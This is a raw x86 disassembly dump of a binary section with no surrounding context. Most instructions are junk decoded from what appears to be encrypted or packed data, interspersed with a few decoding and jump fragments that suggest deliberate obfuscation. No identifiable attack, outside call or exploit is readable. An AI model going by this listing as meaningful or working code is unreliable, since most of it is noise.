  40be7c:	ins    BYTE PTR es:[edi],dx
  40be7d:	std    
  40be7e:	fist   WORD PTR [ebx+0x4a]
  40be81:	addr16 jnp 0x40be74
  40be84:	or     DWORD PTR [edi],esi
  40be86:	xchg   DWORD PTR ds:0x79f5030e,eax
  40be8c:	dec    esp
  40be8d:	cli    
  40be8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be8f:	outs   dx,DWORD PTR ds:[esi]
  40be90:	(bad)  
  40be92:	xlat   BYTE PTR ds:[ebx]
  40be93:	sub    al,0x3b
  40be95:	adc    dh,BYTE PTR [ebx-0x1ff7d37a]
  40be9b:	cmc    
  40be9c:	addr16 jmp 0x40beb8
  40be9f:	or     BYTE PTR [edx-0x3a8e070b],dh
  40bea5:	into   
  40bea6:	js     0x40be4a
  40bea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea9:	pusha  
  40beaa:	or     ah,BYTE PTR ds:0x161e911b
  40beb0:	call   0xfb8bb61
  40beb5:	test   DWORD PTR ds:0x1e413e8c,edi
  40bebb:	dec    ebp
  40bebc:	je     0x40be45
  40bebe:	inc    ebp
  40bebf:	js     0x40bf34
  40bec1:	out    dx,al
  40bec2:	popf   
  40bec3:	test   eax,0x1cbc46fd
  40bec8:	mov    ecx,0x7b0cb37d
  40becd:	nop
  40bece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40becf:	xlat   BYTE PTR ds:[ebx]
  40bed0:	dec    ecx
  40bed1:	(bad)  
  40bed2:	jns    0x40bf07
  40bed4:	add    eax,0x15506f29
  40bed9:	test   dh,bl
  40bedb:	inc    ebp
  40bedc:	push   esp
  40bedd:	jbe    0x40be91
  40bedf:	add    DWORD PTR [ebx-0x7d02f37e],edi
  40bee5:	jb     0x40be68
  40bee7:	test   DWORD PTR [ebx],edx
  40bee9:	jecxz  0x40bf41
  40beeb:	ficom  DWORD PTR [ecx+0x27]
  40beee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beef:	repz fucom st(2)
  40bef2:	add    BYTE PTR ds:0x9293b00f,bh
  40bef8:	jmp    ebx
  40befa:	adc    eax,DWORD PTR [esi+0x5d]
  40befd:	stos   DWORD PTR es:[edi],eax
  40befe:	jae    0x40bea9
  40bf00:	inc    edi
  40bf01:	(bad)  
  40bf02:	out    0x41,eax
  40bf04:	push   esp
  40bf05:	(bad)
  40bf0a:	jne    0x40bef0
  40bf0c:	sbb    BYTE PTR [edi+edi*1-0x46],dh
  40bf10:	ss aam 0x60
  40bf13:	clc    
  40bf14:	cmc    
  40bf15:	data16 icebp 
  40bf17:	ficom  WORD PTR [edx]
  40bf19:	mov    ebp,0xa7beb90f
  40bf1e:	nop
  40bf1f:	and    eax,0xa2bb3fc5
  40bf24:	(bad)  
  40bf25:	pop    ebp
  40bf26:	xchg   ebp,eax
  40bf27:	push   ebp
  40bf28:	ss call 0x3a12:0x528cdd58
  40bf30:	xchg   edi,eax
  40bf31:	popf   
  40bf32:	add    eax,0xe163e2f0
  40bf37:	jp     0x40bf06
  40bf39:	mov    ecx,0x8b2913d7
  40bf3e:	(bad)  
  40bf3f:	out    0x73,eax
  40bf41:	mov    edx,0xd45a334f
  40bf46:	and    BYTE PTR [eax],cl
  40bf48:	rol    DWORD PTR [edi-0x350a77dc],cl
  40bf4e:	popf   
  40bf4f:	sub    eax,0xc9a2c6bd
  40bf54:	cli    
  40bf55:	jbe    0x40bf14
  40bf57:	std    
  40bf58:	repnz push ebp
  40bf5a:	mov    al,0xe3
  40bf5c:	and    edx,DWORD PTR [edx+0x29]
  40bf5f:	or     DWORD PTR [ecx],0xffffffc1
  40bf62:	jo     0x40bf25
  40bf64:	or     ebx,DWORD PTR [edi+0x4]
  40bf67:	shl    esp,0x6e
  40bf6a:	ret    
  40bf6b:	xlat   BYTE PTR ds:[ebx]
  40bf6c:	jns    0x40bf8e
  40bf6e:	inc    eax
  40bf6f:	pop    eax
  40bf70:	mov    ebx,0x917d591b
  40bf75:	mov    dh,0x5d
  40bf77:	icebp  
  40bf78:	push   ds
  40bf79:	mov    al,ds:0x66f20bfd
  40bf7e:	mov    edx,0x75c4abf6
  40bf83:	sbb    BYTE PTR [ebx+0x3f8b087d],cl
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	stc    
  40bfbe:	mov    ah,0x76
  40bfc0:	pop    ds
  40bfc1:	ds xchg esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	push   ebp
  40bfca:	jae    0x40c01c
  40bfcc:	cwde   
  40bfcd:	inc    edi
  40bfce:	in     eax,0xf1
  40bfd0:	dec    ebx
  40bfd1:	dec    edx
  40bfd2:	aad    0x1c
  40bfd4:	mov    eax,ds:0xdb313226
  40bfd9:	test   DWORD PTR [esi],esp
  40bfdb:	pop    ss
  40bfdc:	fld    TBYTE PTR [ebx]
  40bfde:	jne    0x40c002
  40bfe0:	(bad)  
  40bfe1:	out    0xc5,al
  40bfe3:	dec    edx
  40bfe4:	lahf   
  40bfe5:	mov    bl,BYTE PTR [edx]
  40bfe7:	push   ds
  40bfe8:	lods   eax,DWORD PTR ds:[esi]
  40bfe9:	ss lahf 
  40bfeb:	mov    ebx,0xea07474d
  40bff0:	push   ecx
  40bff1:	add    eax,0x659cc374
  40bff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff7:	jbe    0x40bf7a
  40bff9:	xor    BYTE PTR [eax-0x28062f22],dl
  40bfff:	fcom   DWORD PTR [edx+0x97b0d29]
  40c005:	jmp    0x97d5:0x335d2f5
  40c00c:	aas    
  40c00d:	dec    esi
  40c00e:	enter  0x20aa,0x21
  40c012:	fcos   
  40c014:	gs push 0x1c714eee
  40c01a:	imul   edi,DWORD PTR [edx-0x58],0xffffffcd
  40c01e:	in     eax,0x7b
  40c020:	iret   
  40c021:	push   ecx
  40c022:	es inc ebx
  40c024:	outs   dx,BYTE PTR ds:[esi]
  40c025:	push   eax
  40c026:	fidiv  DWORD PTR [eax+0x59]
  40c029:	idiv   BYTE PTR [edi+edx*4]
  40c02c:	dec    esi
  40c02d:	in     eax,0xd5
  40c02f:	fiadd  DWORD PTR [ebp+esi*2+0x74]
  40c033:	sbb    ah,BYTE PTR [ecx]
  40c035:	mov    al,0x8
  40c037:	cdq    
  40c038:	gs gs push esp
  40c03b:	mov    ah,0xe8
  40c03d:	test   eax,0x298981d
  40c042:	push   ds
  40c043:	xor    ebp,esp
  40c045:	xchg   ebx,eax
  40c046:	(bad)  
  40c047:	push   ss
  40c048:	add    edi,DWORD PTR [eax]
  40c04a:	pushf  
  40c04b:	retf   0xe76b
  40c04e:	or     eax,0x4604087a
  40c053:	jne    0x40c02c
  40c055:	dec    edx
  40c056:	test   BYTE PTR [eax],dh
  40c058:	aam    0x1c
  40c05a:	stos   DWORD PTR es:[edi],eax
  40c05b:	cmovp  ecx,DWORD PTR [edi-0x739c388e]
  40c062:	and    edi,DWORD PTR [edx]
  40c064:	add    BYTE PTR [ecx],ch
  40c066:	mov    al,ds:0x2e67fac9
  40c06b:	cmp    bh,bh
  40c06d:	fnsave [esi-0x51949e0b]
  40c073:	(bad)
  40c076:	test   ecx,eax
  40c078:	fcomp  QWORD PTR [ecx]
  40c07a:	data16 std 
  40c07c:	js     0x40c063
  40c07e:	xchg   ebp,eax
  40c07f:	mov    ds,WORD PTR [ebx+0x6f32bd39]
  40c085:	in     eax,dx
  40c086:	sbb    al,0x51
  40c088:	and    eax,0x17efa209
  40c08d:	inc    ebp
  40c08e:	ror    ebp,1
  40c090:	inc    edi
  40c091:	add    esp,ecx
  40c093:	retf   
  40c094:	fwait
  40c095:	cmp    al,0x57
  40c097:	rcr    BYTE PTR [ebp+0xa],cl
  40c09a:	or     DWORD PTR [ebx+0x77],0xe4ab841b
  40c0a1:	push   edi
  40c0a2:	test   al,0xdc
  40c0a4:	push   0xffffff98
  40c0a6:	ffreep st(4)
  40c0a8:	add    al,0xa7
  40c0aa:	aas    
  40c0ab:	fsubr  st(2),st
  40c0ad:	add    ebx,DWORD PTR [eax+0x5]
  40c0b0:	xchg   ecx,eax
  40c0b1:	dec    ecx
  40c0b2:	jns    0x40c07c
  40c0b4:	push   edi
  40c0b5:	dec    ecx
  40c0b6:	dec    ebx
  40c0b7:	pop    eax
  40c0b8:	mov    cl,0x67
  40c0ba:	push   esi
  40c0bb:	aad    0x10
  40c0bd:	fadd   st(3),st
  40c0bf:	fisubr WORD PTR [ebx+0x30]
  40c0c2:	lds    eax,FWORD PTR [eax-0x12433b07]
  40c0c8:	jge    0x40c0ee
  40c0ca:	out    dx,al
  40c0cb:	jecxz  0x40c06c
  40c0cd:	sbb    al,0x5a
  40c0cf:	cld    
  40c0d0:	inc    edx
  40c0d1:	and    eax,0xac347505
  40c0d6:	hlt    
  40c0d7:	or     al,0x92
  40c0d9:	stc    
  40c0da:	dec    esp
  40c0db:	pop    ebp
  40c0dc:	mov    al,0x1e
  40c0de:	add    BYTE PTR [ebp+0x6d],dl
  40c0e1:	sub    al,0xac
  40c0e3:	stos   DWORD PTR es:[edi],eax
  40c0e4:	or     ah,BYTE PTR [eax+0xd8f9472]
  40c0ea:	inc    edx
  40c0eb:	test   BYTE PTR [edx+ebx*1],ch
  40c0ee:	sbb    DWORD PTR [ecx+0x4386aae],0xea43512b
  40c0f8:	sub    BYTE PTR [eax],dh
  40c0fa:	push   cs
  40c0fb:	sar    dh,1
  40c0fd:	dec    eax
  40c0fe:	adc    DWORD PTR [edx+0x371fe933],ecx
  40c104:	adc    BYTE PTR [eax+0x57],ah
  40c107:	clc    
  40c108:	pushf  
  40c109:	sbb    ebp,esp
  40c10b:	ret    
  40c10c:	adc    BYTE PTR [ebx+eiz*1+0x3],al
  40c110:	push   edx
  40c111:	loope  0x40c13a
  40c113:	call   FWORD PTR [ebp-0x45]
  40c116:	jno    0x40c0f9
  40c118:	mov    bh,0x25
  40c11a:	imul   ecx,DWORD PTR [ecx+0x48],0x64b1744e
  40c121:	and    ecx,DWORD PTR [eax]
  40c123:	call   0x5e7a42c3
  40c128:	loope  0x40c16e
  40c12a:	ss sub al,0x56
  40c12d:	das    
  40c12e:	add    ah,BYTE PTR [ecx+ecx*2-0x3cb2040f]
  40c135:	int    0x4e
  40c137:	pop    ebp
  40c138:	loopne 0x40c118
  40c13a:	(bad)  
  40c13b:	jbe    0x40c0fd
  40c13d:	ins    DWORD PTR es:[edi],dx
  40c13e:	xor    eax,0x106cd497
  40c143:	mov    ecx,0xfd22c70e
  40c148:	sbb    BYTE PTR [esp+eax*4+0x32],cl
  40c14c:	outs   dx,BYTE PTR ds:[esi]
  40c14d:	and    DWORD PTR [edi+0x62],ecx
  40c150:	cmp    DWORD PTR ds:0x692d415b,ecx
  40c156:	xor    al,0xdb
  40c158:	dec    esi
  40c159:	icebp  
  40c15a:	push   eax
  40c15b:	mov    al,0x9a
  40c15d:	ds jbe 0x40c167
  40c160:	lock xchg esp,eax
  40c162:	or     BYTE PTR [esi+0xd8900ee],bh
  40c168:	push   edi
  40c169:	mov    ah,0x29
  40c16b:	inc    ecx
  40c16c:	xchg   esp,eax
  40c16d:	out    0xa4,al
  40c16f:	push   0xffffff91
  40c171:	push   ebx
  40c172:	xchg   BYTE PTR [eax-0x6e9dcef0],ch
  40c178:	mov    ah,BYTE PTR [ebx-0x13]
  40c17b:	mov    edi,0xde635c8
  40c180:	pop    eax
  40c181:	aam    0xb5
  40c183:	jecxz  0x40c164
  40c185:	imul   ecx,DWORD PTR [edx],0x94821ff6
  40c18b:	mov    ah,0xad
  40c18d:	aad    0x17
  40c18f:	(bad)  
  40c190:	sub    dh,al
  40c192:	and    DWORD PTR [eax-0x3a6a634e],edi
  40c198:	call   0xb90:0x2f04d999
  40c19f:	add    DWORD PTR [ecx+0x4a192655],0xa9fbbda9
  40c1a9:	xor    DWORD PTR [ecx+0x428b8342],esi
  40c1af:	xchg   BYTE PTR [edx+ebx*4],cl
  40c1b2:	push   ecx
  40c1b3:	stc    
  40c1b4:	jle    0x40c1fb
  40c1b6:	stc    
  40c1b7:	fld    QWORD PTR [esp+edi*4-0x4b]
  40c1bb:	inc    dx
  40c1bd:	test   al,0x1e
  40c1bf:	retf   
  40c1c0:	jl     0x40c18b
  40c1c2:	jnp    0x40c190
  40c1c4:	loop   0x40c1aa
  40c1c6:	and    al,0x55
  40c1c8:	out    dx,al
  40c1c9:	xchg   ecx,eax
  40c1ca:	(bad)  
  40c1cb:	(bad)  
  40c1cc:	arpl   WORD PTR [eax],bx
  40c1ce:	inc    esp
  40c1cf:	cmp    eax,0x6a11e726
  40c1d4:	lods   eax,DWORD PTR ds:[esi]
  40c1d5:	das    
  40c1d6:	(bad)  [ecx]
  40c1d8:	mov    edi,DWORD PTR [edi+eiz*8-0x77]
  40c1dc:	dec    edi
  40c1dd:	mov    BYTE PTR [edi+eiz*2-0x52],cl
  40c1e1:	rcl    DWORD PTR [ecx+eax*4+0x6f5c609a],0x44
  40c1e9:	cmp    BYTE PTR [edi+edx*4-0x54e7d52d],bh
  40c1f0:	into   
  40c1f1:	stos   BYTE PTR es:[edi],al
  40c1f2:	ins    DWORD PTR es:[edi],dx
  40c1f3:	pop    ebp
  40c1f4:	(bad)  
  40c1f5:	scas   al,BYTE PTR es:[edi]
  40c1f6:	out    dx,al
  40c1f7:	or     esi,eax
  40c1f9:	xor    edx,ebp
  40c1fb:	mov    ds:0xd6f32bee,eax
  40c200:	aaa    
  40c201:	mov    al,0x3b
  40c203:	push   esp
  40c204:	dec    edx
  40c205:	call   FWORD PTR [edi+0x39]
  40c208:	cmp    BYTE PTR [eax-0x11],dl
  40c20b:	sbb    cl,BYTE PTR [ebx+ecx*2-0x5865c75a]
  40c212:	and    BYTE PTR [ebp+0x13c91eca],bh
  40c218:	pop    ebx
  40c219:	js     0x40c1a8
  40c21b:	test   BYTE PTR [eax+0x5f],ch
  40c21e:	sbb    BYTE PTR [edi+0x4d],dh
  40c221:	in     eax,dx
  40c222:	adc    al,0x94
  40c224:	push   0xf83010f4
  40c229:	jg     0x40c1dc
  40c22b:	mov    esp,0x219044b6
  40c230:	sub    eax,0x27739611
  40c235:	xchg   ch,bh
  40c237:	mov    ah,0x5d
  40c239:	dec    eax
  40c23a:	sbb    BYTE PTR [ecx],cl
  40c23c:	cs (bad) 
  40c240:	mov    es,WORD PTR [edx]
  40c242:	pop    ebx
  40c243:	or     eax,0x40987bee
  40c248:	push   0xffffffd3
  40c24a:	mov    WORD PTR ds:0xc4bba82e,fs
  40c250:	xor    ah,BYTE PTR [ebx-0x615e1ce2]
  40c256:	mov    esp,0x6a88a1c9
  40c25b:	push   ebp
  40c25c:	mov    bl,0x4
  40c25e:	loope  0x40c1f2
  40c260:	add    eax,0x6e226b7e
  40c265:	test   al,0x26
  40c267:	push   cs
  40c268:	js     0x40c2b0
  40c26a:	mov    edi,0x666f840b
  40c26f:	jle    0x40c285
  40c271:	dec    ebp
  40c272:	retf   0xc481
  40c275:	mov    esp,DWORD PTR [ecx-0x78cacde9]
  40c27b:	push   ebp
  40c27c:	test   eax,0xf8781712
  40c281:	push   esi
  40c282:	sbb    DWORD PTR [edi-0x55],esi
  40c285:	test   eax,0xb64cdc2d
  40c28a:	jo     0x40c293
  40c28c:	icebp  
  40c28d:	pusha  
  40c28e:	icebp  
  40c28f:	sbb    esp,DWORD PTR [ebx-0x57]
  40c292:	mov    esp,0x3bd0677c
  40c297:	dec    ebx
  40c298:	loope  0x40c29e
  40c29a:	jecxz  0x40c313
  40c29c:	test   DWORD PTR [edi+0x64a74ec3],esp
  40c2a2:	nop
  40c2a3:	or     eax,0xd12baf6d
  40c2a8:	dec    eax
  40c2a9:	jmp    0x86f1:0xe57b6943
  40c2b0:	das    
  40c2b1:	ret    0xc70b
  40c2b4:	pop    esp
  40c2b5:	pop    edx
  40c2b6:	pusha  
  40c2b7:	adc    BYTE PTR ds:0x1a146a5c,cl
  40c2bd:	repnz pop ss
  40c2bf:	jb     0x40c33b
  40c2c1:	(bad)  
  40c2c2:	dec    ebx
  40c2c3:	ins    DWORD PTR es:[edi],dx
  40c2c4:	ror    DWORD PTR [ebx-0x749927bb],1
  40c2ca:	jge    0x40c2a0
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x6c],bh
  40c2e3:	leave  
  40c2e4:	ins    BYTE PTR es:[edi],dx
  40c2e5:	cmp    bl,BYTE PTR cs:[ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	jo     0x40c36f
  40c2f0:	push   esi
  40c2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f2:	sbb    al,0x3c
  40c2f4:	and    DWORD PTR [eax],0x1bf28909
  40c2fa:	mov    edx,0xf1190567
  40c2ff:	xchg   ecx,eax
  40c300:	and    dl,BYTE PTR [edx+0x5bd37058]
  40c306:	fcmovb st,st(7)
  40c308:	js     0x40c30e
  40c30a:	(bad)  
  40c30b:	js     0x40c2ce
  40c30d:	ins    BYTE PTR es:[edi],dx
  40c30e:	mov    fs,WORD PTR [edi+esi*1+0x14c35a7e]
  40c315:	out    0x88,al
  40c317:	into   
  40c318:	dec    ecx
  40c319:	xlat   BYTE PTR ds:[ebx]
  40c31a:	inc    ebx
  40c31b:	sbb    dl,cl
  40c31d:	in     al,0x46
  40c31f:	pop    ss
  40c320:	or     eax,0x174dfe40
  40c325:	dec    edx
  40c326:	hlt    
  40c327:	cmp    ecx,DWORD PTR [ecx-0x7b2e0d74]
  40c32d:	fdiv   DWORD PTR [edx-0x5b9edbd7]
  40c333:	scas   eax,DWORD PTR es:[edi]
  40c334:	xor    al,0xad
  40c336:	and    al,0x40
  40c338:	sub    ebx,0x3ebe6156
  40c33e:	dec    edi
  40c33f:	cmp    al,0x8a
  40c341:	aad    0x21
  40c343:	lods   al,BYTE PTR ds:[esi]
  40c344:	mov    DWORD PTR [esi-0x34],edi
  40c347:	inc    ebx
  40c348:	and    DWORD PTR [ecx],0x6845afd1
  40c34e:	popa   
  40c34f:	push   edi
  40c350:	sub    BYTE PTR [ebp-0x4e],ch
  40c353:	fadd   st,st(7)
  40c355:	lods   eax,DWORD PTR ds:[esi]
  40c356:	mov    esp,0x3973b85e
  40c35b:	aas    
  40c35c:	and    DWORD PTR [edx+ebx*4-0x14],edi
  40c360:	les    edx,FWORD PTR ds:0x68ba4e13
  40c366:	lock outs dx,DWORD PTR ds:[esi]
  40c368:	jo     0x40c327
  40c36a:	popa   
  40c36b:	adc    bh,cl
  40c36d:	imul   edi,DWORD PTR [bx+si],0xea44eada
  40c374:	dec    esi
  40c375:	cdq    
  40c376:	xchg   bl,al
  40c378:	mov    edx,0xb54b9aec
  40c37d:	jnp    0x40c333
  40c37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c380:	sub    BYTE PTR [ebx-0x3ba6310b],ah
  40c386:	sbb    ebx,DWORD PTR [edi+0x376105b0]
  40c38c:	sub    BYTE PTR [eax-0x15],0x16
  40c390:	inc    ebx
  40c391:	sub    al,0x86
  40c393:	sub    ah,BYTE PTR [ebp+eax*1+0x7a4fc557]
  40c39a:	push   es
  40c39b:	jl     0x40c3c3
  40c39d:	pushw  0xffcc
  40c3a0:	jnp    0x40c3ec
  40c3a2:	lock lods eax,DWORD PTR ds:[esi]
  40c3a4:	dec    ecx
  40c3a5:	or     ebp,DWORD PTR [edx-0x47]
  40c3a8:	enter  0xd0e2,0xce
  40c3ac:	mov    cl,0xad
  40c3ae:	jbe    0x40c3b3
  40c3b0:	mov    ecx,ebx
  40c3b2:	jecxz  0x40c345
  40c3b4:	test   eax,0x6c06d758
  40c3b9:	pavgb  mm0,QWORD PTR [eax-0x71]
  40c3bd:	call   0x61d3:0x2c090e73
  40c3c4:	cld    
  40c3c5:	xchg   edx,eax
  40c3c6:	xchg   DWORD PTR [ecx+0x546b97bc],edi
  40c3cc:	dec    eax
  40c3cd:	mov    al,ds:0xe74e3e8
  40c3d2:	mov    dh,0xa2
  40c3d4:	fwait
  40c3d5:	ins    DWORD PTR es:[edi],dx
  40c3d6:	mov    BYTE PTR [ebx-0x7],0x1d
  40c3da:	cmp    al,0x37
  40c3dc:	cmp    ecx,ecx
  40c3de:	mov    WORD PTR [bp-0xe],gs
  40c3e2:	push   ecx
  40c3e3:	stc    
  40c3e4:	fs xchg ebx,eax
  40c3e6:	sub    eax,0x3439ac2
  40c3eb:	mov    ds:0x61082667,eax
  40c3f0:	stos   BYTE PTR es:[edi],al
  40c3f1:	stos   BYTE PTR es:[edi],al
  40c3f2:	int3   
  40c3f3:	daa    
  40c3f4:	or     ecx,edx
  40c3f6:	test   DWORD PTR [ebp-0x5b],eax
  40c3f9:	inc    ebx
  40c3fa:	and    BYTE PTR [eax+0xd774947],bh
  40c400:	fdivr  st,st(5)
  40c402:	mov    dl,0x14
  40c404:	aas    
  40c405:	jecxz  0x40c42f
  40c407:	adc    BYTE PTR [edi],cl
  40c409:	xor    DWORD PTR [eax-0x74],edi
  40c40c:	jo     0x40c3bc
  40c40e:	adc    DWORD PTR ds:0x793a6347,0x68
  40c415:	retf   0x32dd
  40c418:	mov    ds:0x6408a3e,eax
  40c41d:	push   cs
  40c41e:	enter  0xa4d2,0x1b
  40c422:	or     ebp,DWORD PTR [ebp-0x1]
  40c425:	xor    al,0xdb
  40c427:	xor    al,0xaf
  40c429:	pop    ss
  40c42a:	mov    ds:0x968c5c26,al
  40c42f:	data16 jecxz 0x40c445
  40c432:	div    BYTE PTR [esi+0x0]
  40c435:	dec    ebp
  40c436:	test   DWORD PTR [edi+0x14],esp
  40c439:	stc    
  40c43a:	gs call 0x1bb8:0x4ff4523b
  40c442:	rcr    DWORD PTR [ecx-0x22],0x75
  40c446:	xchg   ebx,eax
  40c448:	shl    DWORD PTR [edx],0x47
  40c44b:	div    BYTE PTR [edi-0x3e5f3718]
  40c451:	dec    esp
  40c452:	sub    cl,BYTE PTR [eax+0x33f4f526]
  40c458:	or     al,0x8
  40c45a:	nop
  40c45b:	pop    edi
  40c45c:	pusha  
  40c45d:	ins    BYTE PTR es:[edi],dx
  40c45e:	adc    bl,dh
  40c460:	mov    esp,0xddbfecc
  40c465:	mov    ecx,0xa3be95c3
  40c46a:	sbb    BYTE PTR [edx+0x1aab7b1a],bl
  40c470:	push   esp
  40c471:	push   esp
  40c472:	addr16 (bad) 
  40c474:	call   edi
  40c476:	outs   dx,DWORD PTR ds:[esi]
  40c477:	sbb    eax,0x2d9b9f23
  40c47c:	adc    BYTE PTR [edi],cl
  40c47e:	inc    BYTE PTR [eax+0x72485655]
  40c484:	mov    esp,0xc92affd9
  40c489:	mov    bl,0xab
  40c48b:	pusha  
  40c48c:	add    ebx,DWORD PTR [esp+esi*2-0x69]
  40c490:	mov    al,0x56
  40c492:	fdiv   st(2),st
  40c494:	cdq    
  40c495:	sbb    al,0xdd
  40c497:	pushf  
  40c498:	dec    ecx
  40c499:	(bad)  
  40c49a:	xchg   esp,eax
  40c49b:	pop    ecx
  40c49c:	repz out 0xe1,eax
  40c49f:	sub    eax,DWORD PTR [ebx]
  40c4a1:	jecxz  0x40c4ce
  40c4a3:	xor    al,0xda
  40c4a5:	aas    
  40c4a6:	xchg   edx,eax
  40c4a7:	pop    ecx
  40c4a8:	fdiv   DWORD PTR [edi]
  40c4aa:	mov    ds:0xb0d91170,eax
  40c4af:	xchg   edi,eax
  40c4b0:	test   al,0x17
  40c4b2:	mov    fs,WORD PTR [edi]
  40c4b4:	add    BYTE PTR [eax],ah
  40c4b6:	pop    esi
  40c4b7:	out    0x2e,eax
  40c4b9:	int3   
  40c4ba:	out    0x37,al
  40c4bc:	pop    edx
  40c4bd:	int    0xaa
  40c4bf:	cmp    edx,DWORD PTR [ebx]
  40c4c1:	jo     0x40c48c
  40c4c3:	push   eax
  40c4c4:	push   es
  40c4c5:	xlat   BYTE PTR ds:[ebx]
  40c4c6:	dec    ecx
  40c4c7:	push   edx
  40c4c8:	add    esp,DWORD PTR gs:[esi-0x6d]
  40c4cc:	aas    
  40c4cd:	xor    eax,0x2a27ca5e
  40c4d2:	ins    DWORD PTR es:[edi],dx
  40c4d3:	or     esp,DWORD PTR [edi]
  40c4d5:	sbb    al,0x94
  40c4d7:	aam    0x53
  40c4d9:	sbb    eax,0xd71bda4d
  40c4de:	sub    BYTE PTR [ebx-0x6d83c97b],ch
  40c4e4:	imul   DWORD PTR [ecx+ebx*1+0x5781da1e]
  40c4eb:	pop    esi
  40c4ec:	adc    ecx,0x4cf3fad5
  40c4f2:	dec    edx
  40c4f3:	pop    ecx
  40c4f4:	sub    al,BYTE PTR [esi+0x7f]
  40c4f7:	push   cs
  40c4f8:	leave  
  40c4f9:	pusha  
  40c4fa:	loope  0x40c542
  40c4fc:	ja     0x40c4f3
  40c4fe:	stc    
  40c4ff:	(bad)  
  40c500:	mov    ecx,DWORD PTR [edi+0x72]
  40c503:	sbb    eax,0xb52daeec
  40c508:	es cdq 
  40c50a:	add    al,0x99
  40c50c:	lea    edi,[ebp-0x41]
  40c50f:	pop    esp
  40c510:	adc    BYTE PTR [esi],dh
  40c512:	inc    edx
  40c513:	(bad)  
  40c514:	cmc    
  40c515:	cmp    dl,BYTE PTR [ebx]
  40c517:	add    BYTE PTR [eax+ebx*2-0x23a88bc6],0xb9
  40c51f:	adc    al,0xe5
  40c521:	xchg   ecx,eax
  40c522:	add    BYTE PTR [ebx+0x364d69b3],0xc4
  40c529:	jno    0x40c4e9
  40c52b:	imul   eax,DWORD PTR [ebp-0x46d90595],0x163e1b5e
  40c535:	stc    
  40c536:	nop
  40c537:	ja     0x40c4f7
  40c539:	cli    
  40c53a:	ret    
  40c53b:	aas    
  40c53c:	jl     0x40c54c
  40c53e:	es dec edx
  40c540:	aas    
  40c541:	xchg   dl,al
  40c543:	mov    BYTE PTR [edi+0x3a],ch
  40c546:	scas   al,BYTE PTR es:[edi]
  40c547:	jne    0x40c5bf
  40c549:	add    edx,ecx
  40c54b:	xlat   BYTE PTR ds:[ebx]
  40c54c:	push   es
  40c54d:	jmp    0x40c51d
  40c54f:	sub    al,BYTE PTR [edi-0x42]
  40c552:	outs   dx,BYTE PTR ds:[esi]
  40c553:	cmp    eax,edi
  40c555:	sbb    eax,0x19dc9b3f
  40c55a:	shl    ebx,1
  40c55c:	aaa    
  40c55d:	rcr    BYTE PTR [edi+0x66c5e1f6],0x21
  40c564:	lds    edi,FWORD PTR [di-0x4a]
  40c568:	sbb    eax,0x6524605
  40c56d:	or     ebp,DWORD PTR [edi+0x6a]
  40c570:	in     al,dx
  40c571:	xor    al,0x9a
  40c573:	lods   eax,DWORD PTR ds:[esi]
  40c574:	loope  0x40c516
  40c576:	xlat   BYTE PTR ds:[ebx]
  40c577:	cmp    DWORD PTR [edx+0x47],eax
  40c57a:	dec    edi
  40c57b:	popa   
  40c57c:	dec    ecx
  40c57d:	sar    BYTE PTR [eax-0x6799fb9],cl
  40c583:	loope  0x40c5e2
  40c585:	sbb    edx,DWORD PTR [eax]
  40c587:	sbb    BYTE PTR [ecx-0xa],dh
  40c58a:	add    BYTE PTR [ebp+0x37a9b594],ah
  40c590:	mov    bl,0x43
  40c592:	int3   
  40c593:	jp     0x40c590
  40c595:	adc    al,0xa0
  40c597:	or     eax,0x2e8b8fb2
  40c59c:	or     dl,ah
  40c59e:	mov    bh,0x5a
  40c5a0:	xchg   esi,eax
  40c5a1:	mov    eax,0xee710899
  40c5a6:	mov    eax,ds:0x94469d14
  40c5ab:	jecxz  0x40c57e
  40c5ad:	in     eax,dx
  40c5ae:	cwde   
  40c5af:	adc    ebx,0xffffffac
  40c5b2:	mov    bl,BYTE PTR [edx+0x27232fff]
  40c5b8:	or     esp,DWORD PTR [eax+0x5d]
  40c5bb:	(bad)
  40c5be:	jmp    0x40c622
  40c5c0:	fcomi  st,st(1)
  40c5c2:	iret   
  40c5c3:	fdivr  QWORD PTR [esi+0x19]
  40c5c6:	int3   
  40c5c7:	(bad)  
  40c5c8:	sbb    BYTE PTR [ebp-0x3f3eb72f],dh
  40c5ce:	mov    ch,dh
  40c5d0:	ins    DWORD PTR es:[edi],dx
  40c5d1:	push   0x4e
  40c5d3:	sbb    edi,DWORD PTR [ecx+0x59]
  40c5d6:	iret   
  40c5d7:	mov    bl,0x2e
  40c5d9:	jns    0x40c5d3
  40c5db:	push   ss
  40c5dc:	and    esi,DWORD PTR [ebx+0x2c]
  40c5df:	popa   
  40c5e0:	mov    BYTE PTR [edi-0x5b],ah
  40c5e3:	xchg   BYTE PTR [eax+esi*4],ah
  40c5e6:	dec    DWORD PTR [esi-0x8]
  40c5e9:	jecxz  0x40c651
  40c5eb:	xor    edi,ebx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
